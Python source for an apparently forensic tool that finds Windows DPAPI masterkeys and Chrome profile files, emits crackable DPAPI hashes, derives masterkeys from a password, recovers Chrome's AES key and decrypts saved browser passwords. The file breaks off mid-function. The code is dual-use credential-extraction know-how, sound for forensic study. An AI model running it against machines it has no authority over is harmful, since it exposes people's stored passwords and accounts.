from pathlib import Path
import argparse
import json
import base64
import struct
import uuid
import hashlib
import hmac
import sqlite3
import shutil
import tempfile
from datetime import datetime, timedelta, timezone
try:
    from Crypto.Cipher import AES
except ImportError:
    AES = None
# Below are DPAPI Algorithm Numbers
ALG_3DES = 0x6603
ALG_AES_256 = 0x6610
ALG_HMAC = 0x8009
ALG_SHA512 = 0x800E
ALG_SHA1 = 0x8004

def find_dpapi_artifacts(root):
    results = [] # Empty list to store DPAPI artifacts found
    for protect_dir in root.rglob('Microsoft/Protect'): # Look for masterkey folder within  root directory
        if not protect_dir.is_dir(): # Check if Microsoft Protect path is actually a directory
            continue
        for sid_dir in protect_dir.iterdir(): # Go through each SID folder inside Microsoft Protect
            if not sid_dir.is_dir(): # Check if SID path is a directory
                continue
            masterkeys = [] # Empty list to store masterkey files for this SID
            for item in sid_dir.iterdir(): # Go through each file inside  SID directory
                if item.is_file(): # Check if item is a file
                    masterkeys.append({'name': item.name, 'path': str(item), 'size': item.stat().st_size}) # Store masterkey file name, path and size (For viewing later)
            results.append({'sid': sid_dir.name, 'protect_path': str(sid_dir), 'masterkeys': masterkeys}) # Show SID information and its masterkeys in  results 
    return results

def find_chrome_artifacts(root):
    results = [] # Empty list to store Chrome artifacts found
    for local_state in root.rglob('Local State'): # Looks through root directory for Chrome Local State files
        if 'Chrome' not in str(local_state): # Check if local state file is actually Chrome
            continue 
        user_data_dir = local_state.parent # Get Chrome User Data directory
        login_databases = [] # Empty list to store any Login Data databases found
        for login_data in user_data_dir.rglob('Login Data'): # Look for Login Data files inside Chrome User Data directory
            if login_data.is_file(): # Check if Login Data path is a file
                login_databases.append(str(login_data)) # Add Login Data file path to  list
        results.append({'local_state': str(local_state), 'login_data': login_databases}) # Store Local State file and Login Data file found
    return results


def parse_dpapi_blob(blob):
    if len(blob) < 40: # Check if DPAPI blob correct before reading it
        return {'error': 'DPAPI blob is too small'}
    try:
        offset = 0 # Start reading  blob from  beginning
        version = struct.unpack_from('<I', blob, offset)[0] # Read DPAPI version from  first 4 bytes
        offset += 4 # Move by 4 bytes
        provider_raw = blob[offset:offset + 16] # Get next 16 bytes for GUID
        provider_guid = str(uuid.UUID(bytes_le=provider_raw)) # Convert GUID bytes into a readable GUID
        offset += 16 # Move forward by 16 bytes
        masterkey_version = struct.unpack_from('<I', blob, offset)[0] # Read masterkey version
        offset += 4 # Move forward by 4 bytes
        masterkey_raw = blob[offset:offset + 16] # Get next 16 bytes for masterkey GUID
        masterkey_guid = str(uuid.UUID(bytes_le=masterkey_raw)) # Convert masterkey GUID bytes into a readable GUID
        return {'version': version, 'provider_guid': provider_guid, 'masterkey_version': masterkey_version, 'masterkey_guid': masterkey_guid} # Show parsed DPAPI information
    except (struct.error, ValueError) as e: # Errors if blob data cannot be read correctly
        return {'error': f'Failed to parse DPAPI blob: {e}'} # Return error to see whats wrong
    
def parse_local_state(local_state_path):
    try:
        with local_state_path.open('r', encoding='utf-8', errors='replace') as f: # Open Chrome Local State file
            data = json.load(f) # Load JSON data from  file
    except json.JSONDecodeError as e: # Catch error if Local State file contains invalid JSON
        return {'error': f'Invalid JSON: {e}'}
    except OSError as e: # Catch error if file cannot be opened
        return {'error': f'Failed to open Local State: {e}'}
    os_crypt = data.get('os_crypt', {}) # Get os_crypt section from  Local State file
    encrypted_key = os_crypt.get('encrypted_key') # Get encrypted Chrome key
    if not encrypted_key: # Check if encrypted key was found
        return {'found': False, 'message': 'os_crypt.encrypted_key not found'}
    try:
        decoded = base64.b64decode(encrypted_key, validate=True) # Decode encrypted key from Base64
    except Exception as e: # Catch error if Base64 value cannot be decoded
        return {'found': True, 'error': f'Base64 decoding failed: {e}'}
    prefix = decoded[:5] # Get first 5 bytes, Chrome DPAPI keys normally start with DPAPI
    result = {'found': True, 'base64_length': len(encrypted_key), 'decoded_length': len(decoded), 'prefix_hex': prefix.hex(), 'prefix_ascii': prefix.decode('ascii', errors='replace'), 'first_32_bytes_hex': decoded[:32].hex()} # Store basic information about  decoded key
    if decoded.startswith(b'DPAPI'): # Check if key is protected using Windows DPAPI
        result['protection'] = 'Windows DPAPI'
        dpapi_blob = decoded[5:] # Remove DPAPI prefix and keep  actual DPAPI blob
        result['dpapi_blob_length'] = len(dpapi_blob) # Store  size of  DPAPI blob
        result['dpapi_blob_first_32_bytes_hex'] = dpapi_blob[:32].hex() # Store first 32 bytes for inspection
        result['dpapi_metadata'] = parse_dpapi_blob(dpapi_blob) # Parse DPAPI blob to get its information
    else:
        result['protection'] = 'Unknown / non-DPAPI prefix' # Key does not start with  expected DPAPI prefix
    return result

def find_matching_masterkey(report):
    matches = [] # Empty list to store any matching masterkeys found
    for chrome_entry in report['chrome']: # Go through each Chrome artifact found in report
        analysis = chrome_entry.get('local_state_analysis', {}) # Get Local State analysis
        metadata = analysis.get('dpapi_metadata', {}) # Get DPAPI metadata from  Local State
        required_guid = metadata.get('masterkey_guid') # Get masterkey GUID that Chrome requires
        if not required_guid: # Skip if no masterkey GUID was found
            continue
        required_guid = required_guid.lower() # Convert GUID to lowercase so it can be compared properly
        for dpapi_entry in report['dpapi']: # Go through each DPAPI artifact found
            for candidate in dpapi_entry['masterkeys']: # Go through each masterkey file inside  SID directory
                if candidate['name'].lower() == required_guid: # Check if  masterkey filename matches  required GUID
                    matches.append({'required_guid': required_guid, 'sid': dpapi_entry['sid'], 'masterkey_path': candidate['path'], 'local_state': chrome_entry['local_state']}) # Store  matching masterkey information
    return matches

def parse_masterkey_file(path):
    raw = path.read_bytes() # Read masterkey file as bytes
    if len(raw) < 128: # Check if  file is large enough to contain masterkey header
        raise ValueError(f'Masterkey file is too small: {len(raw)} bytes')
    offset = 0 # Start reading from  beginning of  file
    file_version = struct.unpack_from('<I', raw, offset)[0] # Readmasterkey file version
    offset += 4 # Move forward 4 bytes
    offset += 8 # Skip next 8 reserved bytes
    guid_raw = raw[offset:offset + 72] # Get  72 bytes containing GUID
    offset += 72 # Move forward by 72 bytes
    guid = guid_raw.decode('utf-16le', errors='ignore').rstrip('\x00') # Convert GUID bytes into readable text
    offset += 8 # Skip anor 8 reserved bytes
    policy = struct.unpack_from('<I', raw, offset)[0] # Read  policy value
    offset += 4 # Move forward 4 bytes
    masterkey_len = struct.unpack_from('<Q', raw, offset)[0] # Read masterkey block length
    offset += 8 # Move forward 8 bytes
    backupkey_len = struct.unpack_from('<Q', raw, offset)[0] # Read backup key length
    offset += 8 # Move forward 8 bytes
    credhist_len = struct.unpack_from('<Q', raw, offset)[0] # Read credential history length
    offset += 8 # Move forward 8 bytes
    domainkey_len = struct.unpack_from('<Q', raw, offset)[0] # Read domain key length
    offset += 8 # Move forward 8 bytes
    if masterkey_len == 0: # Check if it contains a masterkey block
        raise ValueError('MasterKeyFile does not contain a masterkey block')
    if offset + masterkey_len > len(raw): # get full masterkey block
        raise ValueError('Masterkey block extends beyond  end of  file')
    block = raw[offset:offset + masterkey_len] # Get encrypted masterkey section
    if len(block) < 32: # Check if  encrypted masterkey block is correct
        raise ValueError('Masterkey block is too small') # error if masterkey block is small
    block_offset = 0 # Start reading from  beginning of  masterkey block
    block_version = struct.unpack_from('<I', block, block_offset)[0] # Get masterkey block version
    block_offset += 4 # Move forward 4 bytes
    iv = block[block_offset:block_offset + 16] # Get 16 byte IV used for encryption
    block_offset += 16 # Move forward 16 bytes
    rounds = struct.unpack_from('<I', block, block_offset)[0] # Get number of encryption rounds
    block_offset += 4 # Move forward by 4 bytes
    hash_algo = struct.unpack_from('<I', block, block_offset)[0] # Get hash algorithm ID
    block_offset += 4 # Move forward 4 bytes
    cipher_algo = struct.unpack_from('<I', block, block_offset)[0] # Get cipher algorithm ID
    block_offset += 4 # Move forward 4 bytes
    ciphertext = block[block_offset:] # get and store  remaining bytes as encrypted masterkey
    return {'file_version': file_version, 'guid': guid, 'policy': policy, 'masterkey_len': masterkey_len, 'backupkey_len': backupkey_len, 'credhist_len': credhist_len, 'domainkey_len': domainkey_len, 'block_version': block_version, 'iv': iv, 'rounds': rounds, 'hash_algo': hash_algo, 'cipher_algo': cipher_algo, 'ciphertext': ciphertext} # Show all  parsed masterkey information

def dpapi_algorithm_names(masterkey):
    cipher = masterkey['cipher_algo'] # Get cipher algorithm from masterkey
    hash_algo = masterkey['hash_algo'] # Get hash algorithm from  masterkey
    if cipher == ALG_3DES and hash_algo == ALG_HMAC: # Check to see if masterkey uses older 3DES and SHA1 DPAPI setup
        return {'version': 1, 'cipher': 'des3', 'hash': 'sha1'} # Return older algorithm names
    if cipher == ALG_AES_256 and hash_algo == ALG_SHA512: # Check if masterkey uses AES256 and SHA512
        return {'version': 2, 'cipher': 'aes256', 'hash': 'sha512'} # Return  newer algorithm names
    raise ValueError(f'Unsupported DPAPI algorithm combination: cipher=0x{cipher:04x}, hash=0x{hash_algo:04x}') # If algorithm is not supported n stop (Implement as needed)

def build_dpapi_hash(masterkey, sid, context='local'):
    algorithms = dpapi_algorithm_names(masterkey) # Get cipher and hash names used by masterkey
    contexts = {'local': [1], 'domain1607-': [2], 'domain1607+': [3], 'domain': [2, 3]} # Different DPAPI context values
    if context not in contexts: # Check if context is valid
        raise ValueError(f'Unknown DPAPI context: {context}')
    iv_hex = masterkey['iv'].hex() # Convert IV bytes into hex
    ciphertext_hex = masterkey['ciphertext'].hex() # Convert encrypted masterkey into hex
    results = [] # Empty list to store  DPAPI hash values
    for context_id in contexts[context]: # Go through  context ID values
        value = f"$DPAPImk${algorithms['version']}*{context_id}*{sid}*{algorithms['cipher']}*{algorithms['hash']}*{masterkey['rounds']}*{iv_hex}*{len(ciphertext_hex)}*{ciphertext_hex}" # Build DPAPI hash format
        results.append(value) # Add generated DPAPI hash to list
    return results

def analyze_masterkey_matches(report):
    results = [] # Empty list to store masterkey matches
    for match in report.get('masterkey_matches', []): # Go through each matching masterkey found in report
        path = Path(match['masterkey_path']) # Get  path of  matching masterkey
        try:
            parsed = parse_masterkey_file(path) # Parse masterkey information
            algorithms = dpapi_algorithm_names(parsed) # Get cipher and hash algorithm names
            hashes = build_dpapi_hash(parsed, match['sid'], context='local') # Build  DPAPI hash using  parsed masterkey
            results.append({'required_guid': match['required_guid'], 'sid': match['sid'], 'masterkey_path': match['masterkey_path'], 'parsed_guid': parsed['guid'], 'file_version': parsed['file_version'], 'block_version': parsed['block_version'], 'policy': parsed['policy'], 'masterkey_length': parsed['masterkey_len'], 'rounds': parsed['rounds'], 'cipher_id': parsed['cipher_algo'], 'hash_id': parsed['hash_algo'], 'cipher': algorithms['cipher'], 'hash_algorithm': algorithms['hash'], 'iv_hex': parsed['iv'].hex(), 'ciphertext_length': len(parsed['ciphertext']), 'dpapi_hashes': hashes}) # Store all  masterkey information
        except (OSError, ValueError, struct.error) as e: # Error catching in case masterkey cannot be read
            results.append({'required_guid': match['required_guid'], 'sid': match['sid'], 'masterkey_path': match['masterkey_path'], 'error': str(e)}) # Show error with  masterkey information
    return results

def analyze(root):
    if not root.exists(): # Check if evidence directory exists
        raise FileNotFoundError(f'Directory does not exist: {root}') # Raise error if not found
    if not root.is_dir(): # Check if  path is actually a directory
        raise NotADirectoryError(f'Not a directory: {root}') # Raise error if not directory
    dpapi = find_dpapi_artifacts(root) # Find all DPAPI artifacts inside  directory
    chrome = find_chrome_artifacts(root) # Find all Chrome artifacts inside  directory
    for entry in chrome: # Go through each Chrome artifact found
        entry['local_state_analysis'] = parse_local_state(Path(entry['local_state'])) # Analyze Chrome Local State file
    report = {'root': str(root.resolve()), 'dpapi': dpapi, 'chrome': chrome} # Store  main analysis results
    report['masterkey_matches'] = find_matching_masterkey(report) # Find any DPAPI masterkeys that match Chrome
    report['masterkey_analysis'] = analyze_masterkey_matches(report) # Analyze matching masterkeys
    return report


#////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////#

def print_report(report):
    print('\n=== Chrome Forensic Artifact Discovery ===\n')
    print(f"Evidence root: {report['root']}")
    print('\n--- DPAPI ---')
    if not report['dpapi']:
        print('No DPAPI Protect directories found.')
    else:
        for entry in report['dpapi']:
            print(f"[+] SID: {entry['sid']}")
            print(f"    Directory: {entry['protect_path']}")
            print(f"    Files: {len(entry['masterkeys'])}")
            for masterkey in entry['masterkeys']:
                print(f"      - {masterkey['name']} ({masterkey['size']} bytes)")
    print('\n--- Chrome ---')
    if not report['chrome']:
        print('No Chrome Local State files found.')
    else:
        for entry in report['chrome']:
            print(f"[+] Local State: {entry['local_state']}")
            if entry['login_data']:
                for database in entry['login_data']:
                    print(f'    [+] Login Data: {database}')
            else:
                print('    [-] No Login Data database found.')
            analysis = entry.get('local_state_analysis', {})
            print('\n    --- Local State Analysis ---')
            if analysis.get('error'):
                print(f"    [!] {analysis['error']}")
                continue
            if not analysis.get('found'):
                print('    [-] os_crypt.encrypted_key not found')
                continue
            print(f"    [+] Base64 length: {analysis['base64_length']}")
            print(f"    [+] Decoded length: {analysis['decoded_length']} bytes")
            print(f"    [+] Prefix: {analysis['prefix_ascii']!r}")
            print(f"    [+] Protection: {analysis['protection']}")
            print(f"    [+] First bytes: {analysis['first_32_bytes_hex']}")
            if 'dpapi_blob_length' in analysis:
                print(f"    [+] DPAPI blob length: {analysis['dpapi_blob_length']} bytes")
            metadata = analysis.get('dpapi_metadata')
            if metadata:
                if metadata.get('error'):
                    print(f"    [!] DPAPI parsing error: {metadata['error']}")
                else:
                    print(f"    [+] DPAPI version: {metadata['version']}")
                    print(f"    [+] Provider GUID: {metadata['provider_guid']}")
                    print(f"    [+] Masterkey version: {metadata['masterkey_version']}")
                    print(f"    [+] Required masterkey GUID: {metadata['masterkey_guid']}")
    print('\n--- Masterkey Matching ---')
    matches = report.get('masterkey_matches', [])
    if not matches:
        print('[-] No matching DPAPI masterkey was found.')
    else:
        for match in matches:
            print(f"[+] Required masterkey: {match['required_guid']}")
            print(f"[+] Matching SID: {match['sid']}")
            print(f"[+] Matching masterkey file: {match['masterkey_path']}")
    print('\n--- Masterkey Analysis ---')
    analyses = report.get('masterkey_analysis', [])
    if not analyses:
        print('[-] No matching masterkey available for analysis.')
    else:
        for entry in analyses:
            if entry.get('error'):
                print(f"[!] Failed to parse masterkey: {entry['error']}")
                continue
            print(f"[+] Parsed GUID: {entry['parsed_guid']}")
            print(f"[+] MasterKeyFile version: {entry['file_version']}")
            print(f"[+] Masterkey block version: {entry['block_version']}")
            print(f"[+] Masterkey block size: {entry['masterkey_length']} bytes")
            print(f"[+] Cipher: {entry['cipher']} (0x{entry['cipher_id']:04x})")
            print(f"[+] Hash algorithm: {entry['hash_algorithm']} (0x{entry['hash_id']:04x})")
            print(f"[+] Iterations: {entry['rounds']}")
            print(f"[+] IV: {entry['iv_hex']}")
            print(f"[+] Ciphertext size: {entry['ciphertext_length']} bytes")
            print('\n--- DPAPI Hash ---')
            for value in entry['dpapi_hashes']:
                print(value)

#////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////#


def save_dpapi_hashes(report, output_path):
    hashes = [] # Empty list to store  DPAPI hashes
    for entry in report.get('masterkey_analysis', []): # Go through each analyzed masterkey
        hashes.extend(entry.get('dpapi_hashes', [])) # Add any generated DPAPI hashes to  list
    if not hashes: # Check if no hashes were generated n return nothing
        return 0
    output_path.write_text('\n'.join(hashes) + '\n', encoding='utf-8') # Save all DPAPI hashes into a output file
    return len(hashes) # Return number of hashes that were saved

def microsoft_pbkdf2(secret, salt, length, rounds, digest_name):
    output = b'' # Empty value to store generated key data
    block_number = 1 # Start from PBKDF2 block one
    while len(output) < length: # Keep generating blocks until required length is reached
        initial = salt + struct.pack('>I', block_number) # Add  block number to  salt
        block_number += 1 # Move to  next block number
        derived = bytearray(hmac.new(secret, initial, digestmod=digest_name).digest()) # Create first HMAC value
        for _ in range(rounds - 1): # Repeat  HMAC process for required amount of rounds
            actual = bytearray(hmac.new(secret, derived, digestmod=digest_name).digest()) # Generate next HMAC value
            derived = bytearray((a ^ b for a, b in zip(derived, actual))) # XOR current and new values toger
        output += bytes(derived) # Add generated block to  output
    return output[:length] # Return only amount of bytes that are needed

def derive_local_dpapi_key(password, sid):
    password_sha1 = hashlib.sha1(password.encode('utf-16le')).digest() # Convert password to UTF-16LE and create its SHA1 hash
    sid_bytes = (sid + '\x00').encode('utf-16le') # Add a null value to  SID and convert it to UTF-16LE
    return hmac.new(password_sha1, sid_bytes, hashlib.sha1).digest() # Create and return DPAPI key using  password hash and SID

def compute_dpapi_hmac(hash_name, key_material, salt, value):
    first = hmac.new(key_material, salt, digestmod=hash_name).digest() # Create first HMAC using  key material and salt
    return hmac.new(first, value, digestmod=hash_name).digest() # Create and return final HMAC using  first HMAC and value


def decrypt_local_masterkey(parsed_masterkey, sid, password):
    if AES is None: # Check if PyCryptodome is installed before using AES
        return {'success': False, 'error': 'PyCryptodome is not installed. Please install it'}
    if parsed_masterkey['cipher_algo'] != ALG_AES_256: # Check if masterkey is using AES-256
        return {'success': False, 'error': 'Option 2 currently supports AES-256 DPAPI masterkeys only.'}
    if parsed_masterkey['hash_algo'] != ALG_SHA512: # Check if masterkey is using SHA-512
        return {'success': False, 'error': 'Option 2 currently supports SHA-512 DPAPI masterkeys only.'}
    credential_key = derive_local_dpapi_key(password, sid) # Generate  DPAPI credential key from password and SID
    derived = microsoft_pbkdf2(credential_key, parsed_masterkey['iv'], 48, parsed_masterkey['rounds'], 'sha512') # Generate 32 bytes for AES key and 16 bytes for  IV
    aes_key = derived[:32] # Get  first 32 bytes for AES key
    aes_iv = derived[32:48] # Get  next 16 bytes for AES IV
    cipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv) # Create AES cipher using generated key and IV
    plaintext = cipher.decrypt(parsed_masterkey['ciphertext']) # Decrypt encrypted masterkey data
    if len(plaintext) < 144: # Check if decrypted block is large enough
        return {'success': False, 'error': 'Decrypted masterkey block was unexpectedly short.'}
    hmac_salt = plaintext[:16] # Get first 16 bytes as HMAC salt
    stored_hmac = plaintext[16:80] # Get stored HMAC value
    decrypted_masterkey = plaintext[-64:] # Get final 64 bytes containing decrypted masterkey
    computed_hmac = compute_dpapi_hmac('sha512', credential_key, hmac_salt, decrypted_masterkey) # Calculate HMAC to verify decrypted masterkey
    if not hmac.compare_digest(stored_hmac, computed_hmac): # Compare both HMAC values to check if password is correct
        return {'success': False, 'error': 'Password does not unlock this DPAPI masterkey.'}
    return {'success': True, 'masterkey': decrypted_masterkey, 'masterkey_sha1': hashlib.sha1(decrypted_masterkey).hexdigest()} # Return  decrypted masterkey and its SHA1 hash

def parse_full_dpapi_blob(blob):
    offset = 0 # Start reading DPAPI blob from beginning

    def read_dword():
        nonlocal offset # Use offset from  main function
        if offset + 4 > len(blob): # Check if enough bytes left to read DWORD
            raise ValueError('Unexpected end of DPAPI blob while reading DWORD')
        value = struct.unpack_from('<I', blob, offset)[0] # Read a 4 byte little endian value
        offset += 4 # Move forward 4 bytes
        return value
    
    def read_bytes(length):
        nonlocal offset # Use offset from  main function
        if length < 0 or offset + length > len(blob): # Check if amount of bytes requested is valid
            raise ValueError('Unexpected end of DPAPI blob while reading data')
        value = blob[offset:offset + length] # Read requested amount of bytes
        offset += length # Move forward by amount of bytes read
        return value
    
    version = read_dword() # Read DPAPI blob version
    provider_raw = read_bytes(16) # Read GUID bytes
    masterkey_version = read_dword() # Read masterkey version
    masterkey_guid_raw = read_bytes(16) # Read masterkey GUID bytes
    flags = read_dword() # Read DPAPI flags
    description_len = read_dword() # Read description length
    description_raw = read_bytes(description_len) # Read description bytes
    crypt_algo = read_dword() # Read encryption algorithm ID
    crypt_algo_len = read_dword() # Read encryption algorithm key length
    salt_len = read_dword() # Read salt length
    salt = read_bytes(salt_len) # Read salt bytes
    hmac_key_len = read_dword() # Read HMAC key length
    hmac_key = read_bytes(hmac_key_len) # Read HMAC key bytes
    hash_algo = read_dword() # Read hash algorithm ID
    hash_algo_len = read_dword() # Read hash algorithm length
    hmac_len = read_dword() # Read HMAC value length
    hmac_value = read_bytes(hmac_len) # Read HMAC value
    data_len = read_dword() # Read encrypted data length
    encrypted_data = read_bytes(data_len) # Read encrypted data
    sign_len_offset = offset # Store where signature length starts
    sign_len = read_dword() # Read signature length
    sign = read_bytes(sign_len) # Read signature bytes
    if offset != len(blob): # Check for any unused bytes
        trailing_len = len(blob) - offset
    else:
        trailing_len = 0
    try:
        description = description_raw.decode('utf-16le', errors='replace').rstrip('\x00') # Convert description into readable text
    except Exception:
        description = ''
    return {'version': version, 'provider_guid': str(uuid.UUID(bytes_le=provider_raw)), 'masterkey_version': masterkey_version, 'masterkey_guid': str(uuid.UUID(bytes_le=masterkey_guid_raw)), 'flags': flags, 'description': description, 'crypt_algo': crypt_algo, 'crypt_algo_len': crypt_algo_len, 'salt': salt, 'hmac_key': hmac_key, 'hash_algo': hash_algo, 'hash_algo_len': hash_algo_len, 'hmac': hmac_value, 'encrypted_data': encrypted_data, 'sign': sign, 'to_sign': blob[20:sign_len_offset], 'trailing_len': trailing_len} # Show all parsed DPAPI blob information


def dpapi_hash_name(algorithm_id):
    if algorithm_id == ALG_SHA1: # Check if hash algorithm is SHA1
        return 'sha1'
    if algorithm_id == ALG_SHA512: # Check if hash algorithm is SHA512
        return 'sha512'
    raise ValueError(f'Unsupported DPAPI blob hash algorithm: 0x{algorithm_id:04x}') # Stop if hash algorithm is not supported


def derive_dpapi_blob_key(session_key, hash_name, required_length):
    digest = hashlib.new(hash_name) # Create hash object
    block_size = digest.block_size # Get hash block size
    if len(session_key) > block_size: # Hash session key if it is bigger than  block size
        derived = hmac.new(session_key, digestmod=hash_name).digest()
    else:
        derived = session_key
    if len(derived) < required_length: # Expand key if it is too short
        padded = derived + b'\x00' * (block_size - len(derived)) # Pad key with zeros
        ipad = bytes((value ^ 54 for value in padded[:block_size])) # Create inner padding value
        opad = bytes((value ^ 92 for value in padded[:block_size])) # Create outer padding value
        derived = hashlib.new(hash_name, ipad).digest() + hashlib.new(hash_name, opad).digest() # Generate more key data
    if len(derived) < required_length: # Check if derived key is still too short
        raise ValueError('Derived DPAPI key is shorter than  required cipher key length')
    return derived[:required_length] # Return onl yrequired key length


def remove_pkcs7(data, block_size):
    if not data: # Check for any decrypted data
        raise ValueError('Cannot remove padding from empty plaintext')
    padding = data[-1]
    if padding == 0 or padding > block_size or padding > len(data): # Check if padding amount is valid
        raise ValueError('Invalid DPAPI PKCS#7 padding')
    expected = bytes([padding]) * padding # Build expected padding bytes
    if data[-padding:] != expected: # Check if ending bytes match  expected padding
        raise ValueError('Invalid DPAPI PKCS#7 padding bytes')
    return data[:-padding] # Remove padding and return  real data


def verify_dpapi_blob_signature(parsed_blob, masterkey_hash, hash_name):
    block_size = hashlib.new(hash_name).block_size # Get hash block size
    key_hash_padded = (masterkey_hash + b'\x00' * block_size)[:block_size] # Pad masterkey hash to block size
    ipad = bytes((value ^ 54 for value in key_hash_padded)) # Create inner HMAC padding
    opad = bytes((value ^ 92 for value in key_hash_padded)) # Create outer HMAC padding
    inner = hashlib.new(hash_name, ipad) # Start inner hash
    inner.update(parsed_blob['hmac']) # Add stored HMAC value
    outer = hashlib.new(hash_name, opad) # Start outer hash
    outer.update(inner.digest()) # Add result of  inner hash
    outer.update(parsed_blob['to_sign']) # Add DPAPI data that needs to be verified
    signature_one = outer.digest() # Store first calculated signature
    signature_two = hmac.new(masterkey_hash, parsed_blob['hmac'], digestmod=hash_name) # Create  second HMAC signature method
    signature_two.update(parsed_blob['to_sign']) # Add DPAPI data to  signature
    signature_two = signature_two.digest()
    expected = parsed_blob['sign'] # Get stored signature from DPAPI blob
    return hmac.compare_digest(signature_one, expected) or hmac.compare_digest(signature_two, expected) # Check if eir signature matches


def decrypt_dpapi_blob(dpapi_blob, decrypted_masterkey):
    if AES is None: # Check if PyCryptodome is installed
        raise RuntimeError('PyCryptodome is required. Install it with: pip install pycryptodome')
    parsed = parse_full_dpapi_blob(dpapi_blob) # Parse full DPAPI blob information
    if parsed['crypt_algo'] != ALG_AES_256: # Check if DPAPI blob uses AES-256
        raise ValueError(f"This build currently supports AES-256 DPAPI blobs only. Found cipher 0x{parsed['crypt_algo']:04x}.")
    hash_name = dpapi_hash_name(parsed['hash_algo']) # Get hash algorithm name
    if len(decrypted_masterkey) == 20: # Use key directly if it is already a SHA1 hash
        masterkey_hash = decrypted_masterkey
    else:
        masterkey_hash = hashlib.sha1(decrypted_masterkey).digest() # Create SHA1 hash of  decrypted masterkey
    session_key = hmac.new(masterkey_hash, parsed['salt'], digestmod=hash_name).digest() # Generate  DPAPI session key
    cipher_key = derive_dpapi_blob_key(session_key, hash_name, 32) # Generate 32 byte AES key
    cipher = AES.new(cipher_key, AES.MODE_CBC, iv=b'\x00' * 16) # Create AES-CBC cipher with a zero IV
    padded_plaintext = cipher.decrypt(parsed['encrypted_data']) # Decrypt encrypted DPAPI data
    plaintext = remove_pkcs7(padded_plaintext, AES.block_size) # Removee PKCS7 padding
    signature_valid = verify_dpapi_blob_signature(parsed, masterkey_hash, hash_name) # Check if DPAPI signature is correct
    if not signature_valid: # Stop if signature does not match
        raise ValueError('DPAPI blob decrypted but signature verification failed')
    return {'plaintext': plaintext, 'masterkey_guid': parsed['masterkey_guid'], 'hash_algorithm': hash_name, 'cipher_algorithm': 'aes256', 'signature_valid': True} # Return decrypted DPAPI data


def recover_chrome_aes_key(local_state_path, decrypted_masterkey):
    with local_state_path.open('r', encoding='utf-8', errors='replace') as f: # Open Chrome Local State file
        local_state = json.load(f) # Load Local State JSON data
    os_crypt = local_state.get('os_crypt', {}) # Get Chrome os_crypt section
    encrypted_key_b64 = os_crypt.get('encrypted_key') # Get encrypted Chrome AES key
    if not encrypted_key_b64: # Check if encrypted key exists
        raise ValueError('Local State does not contain os_crypt.encrypted_key')
    decoded = base64.b64decode(encrypted_key_b64, validate=True) # Decode key from Base64
    if not decoded.startswith(b'DPAPI'): # Check if key is protected using Windows DPAPI
        raise ValueError('Chrome encrypted_key does not start with  DPAPI prefix')
    result = decrypt_dpapi_blob(decoded[5:], decrypted_masterkey) # Remove DPAPI prefix and decrypt  Chrome key
    chrome_key = result['plaintext'] # Get decrypted Chrome AES key
    if len(chrome_key) != 32: # Chrome AES key should be 32 bytes
        raise ValueError(f'Unexpected recovered Chrome AES key length: {len(chrome_key)} bytes (expected 32)')
    return {'key': chrome_key, 'sha256': hashlib.sha256(chrome_key).hexdigest(), 'masterkey_guid': result['masterkey_guid'], 'signature_valid': result['signature_valid']} # Return recovered Chrome AES key


def decrypt_chrome_password(encrypted_blob, chrome_key):
    if AES is None:
        raise RuntimeError('PyCryptodome is required.')
    if isinstance(encrypted_blob, memoryview): # Convert memoryview password data into bytes
        encrypted_blob = encrypted_blob.tobytes()
    if not encrypted_blob: # Return nothing if  password blob is empty
        return None
    if not (encrypted_blob.startswith(b'v10') or encrypted_blob.startswith(b'v11')): # Only decrypt v10 and v11 Chrome password blobs
        return None
    if len(encrypted_blob) < 3 + 12 + 16: # Check if encrypted password blob is large enough
        raise ValueError('Chrome AES-GCM password blob is too short')
    nonce = encrypted_blob[3:15] # Get 12 byte AES-GCM nonce
    ciphertext_and_tag = encrypted_blob[15:] # Get ciphertext and auntication tag
    ciphertext = ciphertext_and_tag[:-16] # Get encrypted password data
    tag = ciphertext_and_tag[-16:] # Get final 16 byte auntication tag
    cipher = AES.new(chrome_key, AES.MODE_GCM, nonce=nonce) # Create AES-GCM cipher using Chrome key
    plaintext = cipher.decrypt_and_verify(ciphertext, tag) # Decrypt password and verify auntication tag
    return plaintext.decode('utf-8', errors='replace') # Convert decrypted password bytes into text


def decrypt_login_database(login_data_path, chrome_key):
    if not login_data_path.exists(): # Check if Chrome Login Data file exists
        raise FileNotFoundError(f'Login Data not found: {login_data_path}')
    with tempfile.TemporaryDirectory() as temp_dir: # Create a temp directory for database copy
        working_copy = Path(temp_dir) / 'Login Data' # Create copied database path
        shutil.copy2(login_data_path, working_copy) # Copy Chrome database so  original is not changed
        connection = sqlite3.connect(str(working_copy)) # Connect to copied Chrome Login Data database
        try:
            cursor = connection.cursor() # Create a cursor for SQL commands
            cursor.execute('PRAGMA table_info(logins)') # Get available columns from  logins table
            available_columns = {row[1] for row in cursor.fetchall()} # Store column names
            required = {'origin_url', 'username_value', 'password_value'} # Columns required for decryption
            missing = required - available_columns # Check if any required columns are missing
            if missing: # Stop if database does not contain  required columns
                raise ValueError('Login Data database is missing expected column(s): ' + ', '.join(sorted(missing)))
            requested = ['origin_url', 'action_url', 'username_value', 'password_value', 'date_created', 'date_last_used']
            selected = [column for column in requested if column in available_columns]
            query = 'SELECT ' + ', '.join(selected) + ' FROM logins' # Build SQL query
            if 'date_created' in selected: # Sort records by date if  column exists
                query += ' ORDER BY date_created'
            cursor.execute(query) # Run SQL query
            rows = cursor.fetchall() # Get all login records
        finally:
            connection.close() # Close database connection
    results = [] # Empty list to store decrypted login records

    for row in rows: # Go through every login record found
        record = dict(zip(selected, row)) # Match each value with its column name
        encrypted_password = record.get('password_value') # Get  encrypted password blob
        if isinstance(encrypted_password, memoryview): # Convert memoryview password data into bytes
            encrypted_password = encrypted_password.tobytes()
        blob_format = identify_password_blob(encrypted_password) # Find which Chrome password format is being used
        password = None # Store decrypted password here
        decryption_error = None # Store any decryption error here
        if blob_format in ('v10', 'v11'): # Attempt to decrypt supported Chrome password formats
            try:
                password = decrypt_chrome_password(encrypted_password, chrome_key) # Decrypt  Chrome password
            except Exception as e:
                decryption_error = str(e) # show  error if password decryption fails
        else:
            decryption_error = f'Unsupported password blob format: {blob_format}' # show non supported formats
